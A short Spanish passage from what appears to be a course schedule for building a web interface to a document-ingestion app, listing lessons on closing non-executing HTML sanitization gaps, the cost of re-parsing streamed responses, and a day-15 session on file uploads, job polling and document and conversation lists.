- Los agujeros que no ejecutan código (`class` con Tailwind, `data-*` y `//`), y cómo los cierras.
- El coste de re-parsear la respuesta entera en cada token, con tus números, y que no hay CSP debajo.

**El martes 17-nov (día 15):** documentos y conversaciones en la UI. Seguirás una subida de fichero desde el `FormularioIngesta` hasta el sondeo de `/trabajos/{id}` (el día 05, visto ahora desde el navegador), la lista de documentos con el botón *Leer* que acaba de traer `#44` y la lista de conversaciones. El ejercicio: mostrar en la UI un dato nuevo del trabajo de indexación.
